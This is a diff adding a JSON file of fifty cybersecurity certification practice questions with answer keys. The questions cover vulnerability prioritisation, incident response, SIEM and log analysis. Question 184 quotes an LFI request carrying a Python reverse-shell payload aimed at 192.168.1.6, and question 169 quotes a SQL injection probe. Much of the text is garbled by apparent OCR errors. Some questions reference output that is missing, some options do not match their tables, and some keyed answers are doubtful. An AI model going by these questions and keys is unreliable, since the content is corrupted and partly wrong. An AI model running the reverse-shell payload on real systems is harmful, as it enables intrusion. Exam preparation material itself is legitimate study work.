@@ -1,0 +1,609 @@
+[
+  {
+    "question_number": "151",
+    "question_text": "After completing a review of network activity, the threat hunting team discovers a device on the network that sends an outbound email via a mail client to a non-company email address daily at 10:00 p.m. Which of the following is potentially occurring?",
+    "image": null,
+    "options": {
+      "A": "Irregular peer-to-peer communication",
+      "B": "Rogue device on the network",
+      "C": "Abnormal OS process behavior",
+      "D": "Data exfiltration  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "152",
+    "question_text": "A vulnerability scanner generates the following output:\n\n\"IP address\n\",\"Name\n\",\"Vulnerability\n state\n\",\"cvss\n\",\"Age\n\"\r\n\"10.12.2.40\n\",\"SSL Certificate Cannot Be Trusted\n\",\"New\n\",\"6.4\n\",\"13 days\n\"\r\n\"10.16.2.52\n\",\"Redis Server Unprotected by Password\n Authentication\n\",\"Active\n\",\"7.5\n\",\"43 days\n\"\r\n\"10.100.26.60\n\",\"Cisco Webex Meetings Scheduled Meeting\n Template Deletion\n\",\"Resurfaced\n\",\"6\n\",\"701 days\n\"\r\n\"10.14.0.15\n\",\"SMB Signing not required\n\",\"Active\n\",\"5\n\",\"25 days\n\"\r\n\"10.12.2.40\n\",\"SSL Self-Signed Certificate\n\",\"New\n\",\"6.4\n\",\"13 days\n\"\r\n\"172.27.2.153\n\",\"Sysinternals PaExec Elevation of Privilege\n (CVE-2021-1733)\n\",\"Resurfaced\n\",\"4.6\n\",\"435 days\n\"\r\n\"172.27.2.153\n\",\"Oracle Java JDK JRE 6 Update 30 Multiple\n Vulnerabilitian\n\",\"Resurfaced\n\",\"10\n\",\"4 daya\n\"\n\nThe company has an SLA for patching that requires time frames to be met for high-risk vulnerabilities. Which of the following should the analyst prioritize first for remediation?",
+    "image": null,
+    "options": {
+      "A": "Oracle JDK  ",
+      "B": "Cisco Webex",
+      "C": "Redis Server",
+      "D": "SSL Self-signed Certificate"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "153",
+    "question_text": "A web application team notifies a SOC analyst that there are thousands of HTTP/404 events on the public-facing web server. Which of the following is the next step for the analyst to take?",
+    "image": null,
+    "options": {
+      "A": "Instruct the firewall engineer that a rule needs to be added to block this external server",
+      "B": "Escalate the event to an incident and notify the SOC manager of the activity",
+      "C": "Notify the incident response team that there is a DDoS attack occurring",
+      "D": "Identify the IP/hostname for the requests and look at the related activity  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "154",
+    "question_text": "Which of the following best describes the reporting metric that should be utilized when measuring the degree to which a system application, or user base is affected by an uptime availability outage?",
+    "image": null,
+    "options": {
+      "A": "Timeline",
+      "B": "Evidence",
+      "C": "Impact  ",
+      "D": "Scope"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "155",
+    "question_text": "A security analyst needs to provide evidence of regular vulnerability scanning on the company's network for an auditing process. Which of the following is an example of a tool that can produce such evidence?",
+    "image": null,
+    "options": {
+      "A": "OpenVAS  ",
+      "B": "Burp Suite",
+      "C": "Nmap",
+      "D": "Wireshark"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "156",
+    "question_text": "A security analyst performs a vulnerability scan. Based on the metrics from the scan results, the analyst must prioritize which hosts to patch. The analyst runs the tool and receives the following output:\n\nHost CVE: (Vulnerability Fame) Hetrios\n\nhost01 CVE-2003-99992: (TransAti) 2DS:KOA:HVT\n\nhost02 CVE-2004-99993: (IBF)\n\nDOS:AEX:NOA\n\nCVE-2007-99996:\n\nhostos\n\nRCE:AEX HVE\n\n(NarrowStairs\n\nhost04\n\nCVE-2009-99995:\n\nUDD NOA\n\n(Topendoor)\n\nDDS: Denial of service vulnerability\n\nRCE: Remote code execution vulnerability\n\nUDD: Unauthorized disclosure of date vulnerability\n\nAEX: Vulnerability is being exploited actively explossen\n\nNOA: No authentication required\n\nHVT: Heat is a high value target\n\nHEX: Host is externally available to public Internet\n\nWhich of the following hosts should be patched first, based on the metrics?",
+    "image": null,
+    "options": {
+      "A": "host01",
+      "B": "host02",
+      "C": "host03  ",
+      "D": "host04"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "157",
+    "question_text": "An organization receives a legal hold request from an attorney. The request pertains to emails related to a disputed vendor contract. Which of the following is the best step for the security team to take to ensure compliance with the request?",
+    "image": null,
+    "options": {
+      "A": "Publicly disclose the request to other vendors",
+      "B": "Notify the departments involved to preserve potentially relevant information  ",
+      "C": "Establish a chain of custody starting with the attorney's request",
+      "D": "Back up the mailboxes on the server and provide the attorney with a copy"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "158",
+    "question_text": "A company has the following security requirements:\n\n• No public IPs\n\n• All data secured at rest\n\n• No insecure ports/protocols\n\nAfter a cloud scan is completed a security analyst receives reports that several misconfigurations are putting the company at risk. Given the following cloud scanner output:\n\n\"VM name\n\",\"VM DEV DE\n\",\"VN PRD Web01\n\",\"VM DEV Web02\n\",\"VM PAD DE\n\"\r\n\"IP\n config\n\",\"private\n\",\"public\n\",\"public\n\",\"pubize\n\"\r\n\"Encryptino\n\",,\"yes\n\",\"yes\n\",\"ne\n\"\r\n\"Ingress\n port\n\",\"443, open\n\",\"3389, open\n\",\"22, cpen\n\",\"50, open\n\"\n\nWhich of the following should the analyst recommend be updated first to meet the security requirements and reduce risks?",
+    "image": null,
+    "options": {
+      "A": "VM_PRD_DB  ",
+      "B": "VM_DEV_DB",
+      "C": "VM_DEV_Web02",
+      "D": "VM_PRD_Web01"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "159",
+    "question_text": "Which of the following best describes the actions taken by an organization after the resolution of an incident that addresses issues and reflects on the growth opportunities for future incidents?",
+    "image": null,
+    "options": {
+      "A": "Lessons learned  ",
+      "B": "Scrum review",
+      "C": "Root cause analysis",
+      "D": "Regulatory compliance"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "160",
+    "question_text": "An analyst is becoming overwhelmed with the number of events that need to be investigated for a timeline. Which of the following should the analyst focus on in order to move the incident forward?",
+    "image": null,
+    "options": {
+      "A": "Impact  ",
+      "B": "Vulnerability score",
+      "C": "Mean time to detect",
+      "D": "Isolation"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "161",
+    "question_text": "To minimize the impact of a security incident, a cybersecurity analyst has configured audit settings in the organization's cloud services. Which of the following security controls has the analyst configured?",
+    "image": null,
+    "options": {
+      "A": "Preventive",
+      "B": "Corrective",
+      "C": "Directive",
+      "D": "Detective  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "162",
+    "question_text": "A web developer reports the following error that appeared on a development server when testing a new application:\n\nWhich of the following tools can be used to identify the application's point of failure?",
+    "image": null,
+    "options": {
+      "A": "OpenVAS",
+      "B": "Angry IP scanner",
+      "C": "Immunity debugger  ",
+      "D": "Burp Suite"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "163",
+    "question_text": "Which of the following describes a contract that is used to define the various levels of maintenance to be provided by an external business vendor in a secure environment?",
+    "image": null,
+    "options": {
+      "A": "MOU",
+      "B": "NDA",
+      "C": "BIA",
+      "D": "SLA  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "164",
+    "question_text": "A security team is concerned about recent Layer 4 DDoS attacks against the company website. Which of the following controls would best mitigate the attacks?",
+    "image": null,
+    "options": {
+      "A": "Block the attacks using firewall rules",
+      "B": "Deploy an IPS in the perimeter network",
+      "C": "Roll out a CDN  ",
+      "D": "Implement a load balancer"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "165",
+    "question_text": "An analyst is reviewing system logs while threat hunting:\n\n\"Time\n\",\"Host\n\",\"Parent\n Process\n\",\"Child Process\n\"\r\n\"1:15PM\n\",\"PC1\n\",\"wininit.exe\n\",\"services.exe\n\"\r\n\"1:15PM\n\",\"PC3\n\",\"outlook.exe\n\",\"excel.exe\n\"\r\n\"1:15PM\n\",\"PC2\n\",\"explorer.exe\n\",\"chrome.exe\n\"\r\n\"1:15PM\n\",\"PC1\n\",\"wininit.exe\n\",\"lsass.exe\n\"\r\n\"1:16PM\n\",\"PC1\n\",\"services.exe\n\",\"svchost.exe\n\"\r\n\"1:16PM\n\",\"PC5\n\",\"cmd.exe\n\",\"calc.exe\n\"\r\n\"1:16PM\n\",\"PC3\n\",\"excel.exe\n\",\"procdunp.exe\n\"\r\n\"1:16PM\n\",\"PC4\n\",\"explorer.exe\n\",\"mstsc.exe\n\"\r\n\"1:17PM\n\",\"PC5\n\",\"explorer.exe\n\",\"firefox.exe\n\"\n\nWhich of the following hosts should be investigated first?",
+    "image": null,
+    "options": {
+      "A": "PC1",
+      "B": "PC2",
+      "C": "PC3  ",
+      "D": "PC4",
+      "E": "PC5"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "166",
+    "question_text": "An organization needs to bring in data collection and aggregation from various endpoints. Which of the following is the best tool to deploy to help analysts gather this data?",
+    "image": null,
+    "options": {
+      "A": "DLP",
+      "B": "NAC",
+      "C": "EDR  ",
+      "D": "NIDS"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "167",
+    "question_text": "A regulated organization experienced a security breach that exposed a list of customer names with corresponding PII data. Which of the following is the best reason for developing the organization's communication plans?",
+    "image": null,
+    "options": {
+      "A": "For the organization's public relations department to have a standard notification",
+      "B": "To ensure incidents are immediately reported to a regulatory agency  ",
+      "C": "To automate the notification to customers who were impacted by the breach",
+      "D": "To have approval from executive leadership on when communication should occur"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "168",
+    "question_text": "Following an incident, a security analyst needs to create a script for downloading the configuration of all assets from the cloud tenancy. Which of the following authentication methods should the analyst use?",
+    "image": null,
+    "options": {
+      "A": "MFA",
+      "B": "User and password",
+      "C": "PAM",
+      "D": "Key pair  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "169",
+    "question_text": "A penetration tester is conducting a test on an organization's software development website. The penetration tester sends the following request to the web interface:\n\nTarget Proxy Spider Scanner Intruder Repeater Sequencer Deci\n\nGo\n\nCancel\n\nRequest\n\nRaw Params Headers Hex\n\n/owaspbricks/content-1/index.php?id=020UMION 20\n\nSELECTAZONULL, 120NULL, 20NULI.\n\nHost: 172.16.67.136\n\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac\n OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0\n\nAccept:\n\n$text/b$ html,application/xhtml+xml,application/xml;\n $q=0.9$,*/*;q 0.8\n\nWhich of the following exploits is most likely being attempted?",
+    "image": null,
+    "options": {
+      "A": "SQL injection",
+      "B": "Local file inclusion",
+      "C": "Cross-site scripting",
+      "D": "Directory traversal"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "170",
+    "question_text": "Two employees in the finance department installed a freeware application that contained embedded malware. The network is robustly segmented based on areas of responsibility. These computers had critical sensitive information stored locally that needs to be recovered. The department manager advised all department employees to turn off their computers until the security team could be contacted about the issue. Which of the following is the first step the incident response staff members should take when they arrive?",
+    "image": null,
+    "options": {
+      "A": "Turn on all systems, scan for infection, and back up data to a USB storage device.",
+      "B": "Identify and remove the software installed on the impacted systems in the department.",
+      "C": "Explain that malware cannot truly be removed and then reimage the devices.",
+      "D": "Log on to the impacted systems with an administrator account that has privileges to perform backups.",
+      "E": "Segment the entire department from the network and review each computer offline.  "
+    },
+    "correct_answer": "E"
+  },
+  {
+    "question_number": "171",
+    "question_text": "A manufacturer has hired a third-party consultant to assess the security of an OT network that includes both fragile and legacy equipment. Which of the following must be considered to ensure the consultant does no harm to operations?",
+    "image": null,
+    "options": {
+      "A": "Employing Nmap Scripting Engine scanning techniques",
+      "B": "Preserving the state of PLC ladder logic prior to scanning",
+      "C": "Using passive instead of active vulnerability scans  ",
+      "D": "Running scans during off-peak manufacturing hours"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "172",
+    "question_text": "A team of analysts is developing a new internal system that correlates information from a variety of sources, analyzes that information, and then triggers notifications according to company policy. Which of the following technologies was deployed?",
+    "image": null,
+    "options": {
+      "A": "SIEM  ",
+      "B": "SOAR",
+      "C": "IPS",
+      "D": "CERT"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "173",
+    "question_text": "Which of following would best mitigate the effects of a new ransomware attack that was not properly stopped by the company antivirus?",
+    "image": null,
+    "options": {
+      "A": "Install a firewall.",
+      "B": "Implement vulnerability management.",
+      "C": "Deploy sandboxing.  ",
+      "D": "Update the application blocklist."
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "174",
+    "question_text": "A Chief Information Security Officer wants to implement security by design, starting with the implementation of a security scanning method to identify vulnerabilities, including SQL injection, RFI, XSS, etc. Which of the following would most likely meet the requirement?",
+    "image": null,
+    "options": {
+      "A": "Reverse engineering",
+      "B": "Known environment testing",
+      "C": "Dynamic application security testing  ",
+      "D": "Code debugging"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "175",
+    "question_text": "A security analyst scans a host and generates the following output:\n\nPORT STATE SERVICE VERSIO\n\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu ubuntu0.3 (Ubuntu Linux; protocol 2.8\n Issh-hostkey:\n\n2048 90:00:98:da:ed:32:3d:Bb:3f:42:40:07:93:4f:fd:68 (RSA)\n 256 4c:f4:20:24:82:cf:9c:8d:e2:@c:52:46:20:25:12:09 (ECDSA)\n 256 39:fb:e3:f4:ba:d6:le:72:7:97:25:82:87:6e:ea:01 (E025519)\n\n88/tcp open http Apache httpd 2.4.29 ((Ubuntu))\n 1_http-title: Apache2 Ubuntu Default Page: It works\n 1_http-server-header: Apache/2.4.29 (Ubuntu)\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nWhich of the following best describes the output?",
+    "image": null,
+    "options": {
+      "A": "The host is unresponsive to the ICMP request.",
+      "B": "The host is running a vulnerable mail server.",
+      "C": "The host is allowing unsecured FTP connections.",
+      "D": "The host is vulnerable to web-based exploits.  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "176",
+    "question_text": "The security team at a company, which was a recent target of ransomware, compiled a list of hosts that were identified as impacted and in scope for this incident. Based on the following host list:\n\n\"Impacted hostname\n\",\"OS\n\",\"Function\n\"\r\n\"SQL01\n\",\"Windows 2012 R2\n\",\"SQL Database Server\n\"\r\n\"WK10-Sales07\n\",\"Windows 10\n\",\"Corporate Laptop\n\"\r\n\"WK7-Plant01\n\",\"Windows 7\n\",\"Assembly/plant System\n\"\r\n\"DCEast01\n\",\"Windows Server 2016\n\",\"Domain Controller\n\"\r\n\"HQAdmin9\n\",\"Windows 11\n\",\"Network Admin Laptop\n\"\n\nWhich of the following systems was most pivotal to the threat actor in its distribution of the encryption binary via Group Policy?",
+    "image": null,
+    "options": {
+      "A": "SQL01",
+      "B": "WK10-Sales07",
+      "C": "WK7-Plant01",
+      "D": "DCEast01  ",
+      "E": "HQAdmin9"
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "177",
+    "question_text": "After a security assessment was done by a third-party consulting firm, the cybersecurity program recommended integrating DLP and CASE to reduce analyst alert fatigue. Which of the following is the best possible outcome that this effort hopes to achieve?",
+    "image": null,
+    "options": {
+      "A": "SIEM ingestion logs are reduced by 20%.",
+      "B": "Phishing alerts drop by 20%.",
+      "C": "False positive rates drop to 20%.  ",
+      "D": "The MTTR decreases by 20%."
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "178",
+    "question_text": "Which of the following threat actors is most likely to target a company due to its questionable environmental policies?",
+    "image": null,
+    "options": {
+      "A": "Hacktivist  ",
+      "B": "Organized crime",
+      "C": "Nation-state",
+      "D": "Lone wolf"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "179",
+    "question_text": "A cybersecurity analyst is recording the following details:\n\n• ID\n\n• Name\n\n• Description\n\nClassification of information\n\n• Responsible party\n\nIn which of the following documents is the analyst recording this information?",
+    "image": null,
+    "options": {
+      "A": "Risk register  ",
+      "B": "Change control documentation",
+      "C": "Incident response playbook",
+      "D": "Incident response plan"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "180",
+    "question_text": "A SOC manager is establishing a reporting process to manage vulnerabilities. Which of the following would be the best solution to identify potential loss incurred by an issue?",
+    "image": null,
+    "options": {
+      "A": "Trends",
+      "B": "Risk score  ",
+      "C": "Mitigation",
+      "D": "Prioritization"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "181",
+    "question_text": "While configuring a SIEM for an organization, a security analyst is having difficulty correlating incidents across different systems. Which of the following should be checked first?",
+    "image": null,
+    "options": {
+      "A": "If appropriate logging levels are set",
+      "B": "NTP configuration on each system  ",
+      "C": "Behavioral correlation settings",
+      "D": "Data normalization rules"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "182",
+    "question_text": "During a scan of a web server in the perimeter network, a vulnerability was identified that could be exploited over port 3389. The web server is protected by a WAF. Which of the following best represents the change to overall risk associated with this vulnerability?",
+    "image": null,
+    "options": {
+      "A": "The risk would not change because network firewalls are in use",
+      "B": "The risk would decrease because RDP is blocked by the firewall",
+      "C": "The risk would decrease because a web application firewall is in place",
+      "D": "The risk would increase because the host is external facing  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "183",
+    "question_text": "Several vulnerability scan reports have indicated runtime errors as the code is executing. The dashboard that lists the errors has a command-line interface for developers to check for vulnerabilities. Which of the following will enable a developer to correct this issue? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Performing dynamic application security testing",
+      "B": "Reviewing the code  ",
+      "C": "Fuzzing the application",
+      "D": "Debugging the code  ",
+      "E": "Implementing a coding standard",
+      "F": "Implementing IDS"
+    },
+    "correct_answer": "BD"
+  },
+  {
+    "question_number": "184",
+    "question_text": "A security analyst is trying to validate the results of a web application scan with Burp Suite. The security analyst performs the following:\n\nRequest\n\nRaw Params\n\nHeaders\n\nHex\n\nGET\n\n/index.php?view/var/log/apache2/access.log&c@d-python+-c'import socket, subpr\n ocess, os%3bs%3dsocket.socket/socket AF INET, socket. SOCK STREAM13bs.connect 1192.168.\n 1.6.44441153hos-dup2(s filenoll 01136 os.dup2is filenof) 11 3b os.dup2is.filenci 21%\n\n3bp%3dsubprocess.callil/bin/sh\"  i 11:36 HTTP/1.1\n\nHost: secureapplication example\n\nUser-Agent: Mozilla/5.0 (X11: Linus 186 64; rv:52.01 Gecko/20100101 Firefox/52.0\n Accept: text/html application/xhtml+xml application/xml q=0.9,*/    0.8\n\nAccept-Language: en-US, en; q 0.5\n\nAccept-Encoding: gzip, deflate\n\nCookie: PHPSESSID=ohsfooqof Bognj1tjp98ufv2h6\n\nConnection: close\n\nUpgrade-Insecure Requests: 1\n\nContent-Length: 0\n\nWhich of the following vulnerabilities is the security analyst trying to validate?",
+    "image": null,
+    "options": {
+      "A": "SQL injection",
+      "B": "LFI  ",
+      "C": "XSS",
+      "D": "CSRF"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "185",
+    "question_text": "A cybersecurity team has witnessed numerous vulnerability events recently that have affected operating systems. The team decides to implement host-based IPS, firewalls and two-factor authentication. Which of the following does this most likely describe?",
+    "image": null,
+    "options": {
+      "A": "System hardening  ",
+      "B": "Hybrid network architecture",
+      "C": "Continuous authorization",
+      "D": "Secure access service edge"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "186",
+    "question_text": "A security analyst needs to secure digital evidence related to an incident. The security analyst must ensure that the accuracy of the data cannot be repudiated. Which of the following should be implemented?",
+    "image": null,
+    "options": {
+      "A": "Offline storage",
+      "B": "Evidence collection",
+      "C": "Integrity validation  ",
+      "D": "Legal hold"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "187",
+    "question_text": "An analyst investigated a website and produced the following:\n\nStarting Nmap 7.92 (https://rmap.org) at 2022-07-21 10:21 CDT\n\nNmap scan report for insecure.org (45.33.49.119)\n\nHost is up (8.854s latency).\n\nFDNS record for 45.33.49.119: ack.nmap.org\n\nNot shown: 95 filtered tcp ports (no-response)\n\nPORT STATE SERVICE\n\nVERSION\n\n22/tcp open\n\nssh\n\nOpenSSH 7.4 (protocol 2.0)\n\n25/tcp closed smtp\n\n80/tcp open\n\nhttp\n\nApache httpå 2.4.6\n\n113/tcp closed ident\n\n443/tcp open ssi/http Apache httpd 2.4.6\n\nService Info: Host: issues.rmap.org\n\nService detection performed. Please report any incorrect results at https://nmap\n .org/submit/\n\nNmap done: 1 IP address (1 host up) scanned in 20.52 seconds\n\nWhich of the following syntaxes did the analyst use to discover the application versions on this vulnerable website?",
+    "image": null,
+    "options": {
+      "A": "птар -sS-T4-F insecure.org",
+      "B": "nmap -C insecure.org",
+      "C": "nmap-sV-T4-F insecure.org  ",
+      "D": "nmap -A insecure.org"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "188",
+    "question_text": "A cybersecurity analyst is doing triage in a SIEM and notices that the time stamps between the firewall and the host under investigation are off by 43 minutes. Which of the following is the most likely scenario occurring with the time stamps?",
+    "image": null,
+    "options": {
+      "A": "The NTP server is not configured on the host  ",
+      "B": "The cybersecurity analyst is looking at the wrong information",
+      "C": "The firewall is using UTC time",
+      "D": "The host with the logs is offline"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "189",
+    "question_text": "A payroll department employee was the target of a phishing attack in which an attacker impersonated a department director and requested that direct deposit information be updated to a new account. Afterward, a deposit was made into the unauthorized account. Which of the following is one of the first actions the incident response team should take when they receive notification of the attack?",
+    "image": null,
+    "options": {
+      "A": "Scan the employee's computer with virus and malware tools",
+      "B": "Review the actions taken by the employee and the email related to the event  ",
+      "C": "Contact human resources and recommend the termination of the employee",
+      "D": "Assign security awareness training to the employee involved in the incident"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "190",
+    "question_text": "A security analyst has found the following suspicious DNS traffic while analyzing a packet capture:\n\n• DNS traffic while a tunneling session is active.\n\nThe mean time between queries is less than one second.\n\n• The average query length exceeds 100 characters.\n\nWhich of the following attacks most likely occurred?",
+    "image": null,
+    "options": {
+      "A": "DNS exfiltration  ",
+      "B": "DNS spoofing",
+      "C": "DNS zone transfer",
+      "D": "DNS poisoning"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "191",
+    "question_text": "A small company does not have enough staff to effectively segregate duties to prevent error and fraud in payroll management. The Chief Information Security Officer (CISO) decides to maintain and review logs and audit trails to mitigate risk. Which of the following did the CISO implement?",
+    "image": null,
+    "options": {
+      "A": "Corrective controls",
+      "B": "Compensating controls  ",
+      "C": "Operational controls",
+      "D": "Administrative controls"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "192",
+    "question_text": "During the log analysis phase, the following suspicious command is detected:\n\nWhich of the following is being attempted?",
+    "image": null,
+    "options": {
+      "A": "Buffer overflow",
+      "B": "RCE  ",
+      "C": "ICMP tunneling",
+      "D": "Smurf attack"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "193",
+    "question_text": "An email hosting provider added a new data center with new public IP addresses. Which of the following most likely needs to be updated to ensure emails from the new data center do not get blocked by spam filters?",
+    "image": null,
+    "options": {
+      "A": "DKIM",
+      "B": "SPF  ",
+      "C": "SMTP",
+      "D": "DMARC"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "194",
+    "question_text": "A laptop that is company owned and managed is suspected to have malware. The company implemented centralized security logging. Which of the following log sources will confirm the malware infection?",
+    "image": null,
+    "options": {
+      "A": "XDR logs  ",
+      "B": "Firewall legs",
+      "C": "IDS logs",
+      "D": "MFA logs"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "195",
+    "question_text": "Which of the following best describes the goal of a disaster recovery exercise as preparation for possible incidents?",
+    "image": null,
+    "options": {
+      "A": "To provide metrics and test continuity controls  ",
+      "B": "To verify the roles of the incident response team",
+      "C": "To provide recommendations for handling vulnerabilities",
+      "D": "To perform tests against implemented security controls"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "196",
+    "question_text": "A security analyst has prepared a vulnerability scan that contains all of the company's functional subnets. During the initial scan users reported that network printers began to print pages that contained unreadable text and icons. Which of the following should the analyst do to ensure this behavior does not occur during subsequent vulnerability scans?",
+    "image": null,
+    "options": {
+      "A": "Perform non-credentialed scans",
+      "B": "Ignore embedded web server ports",
+      "C": "Create a tailored scan for the printer subnet  ",
+      "D": "Increase the threshold length of the scan timeout"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "197",
+    "question_text": "A Chief Information Security Officer has outlined several requirements for a new vulnerability scanning project:\n\n• Must use minimal network bandwidth.\n\n• Must use minimal host resources\n\n• Must provide accurate, near real-time updates\n\n• Must not have any stored credentials in configuration on the scanner\n\nWhich of the following vulnerability scanning methods should be used to best meet these requirements?",
+    "image": null,
+    "options": {
+      "A": "Internal",
+      "B": "Agent  ",
+      "C": "Active",
+      "D": "Uncredentialed"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "198",
+    "question_text": "An employee is no longer able to log in to an account after updating a browser. The employee usually has several tabs open in the browser. Which of the following attacks was most likely performed?",
+    "image": null,
+    "options": {
+      "A": "RFI",
+      "B": "LFI",
+      "C": "CSRF  ",
+      "D": "XSS"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "199",
+    "question_text": "Which of the following does \"federation\" most likely refer to within the context of identity and access management?",
+    "image": null,
+    "options": {
+      "A": "Facilitating groups of users in a similar function or profile to system access that requires elevated or conditional access",
+      "B": "An authentication mechanism that allows a user to utilize one set of credentials to access multiple domains  ",
+      "C": "Utilizing a combination of what you know who you are, and what you have to grant authentication to a user",
+      "D": "Correlating one's identity with the attributes and associated applications the user has access to"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "200",
+    "question_text": "The Chief Information Security Officer for an organization recently received approval to install a new EDR solution. Following the installation, the number of alerts that require remediation by an analyst has tripled. Which of the following should the organization utilize to best centralize the workload for the internal security team? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "SOAR  ",
+      "B": "SIEM  ",
+      "C": "MSP",
+      "D": "NGFW",
+      "E": "XDR",
+      "F": "DLP"
+    },
+    "correct_answer": "AB"
+  }
+]
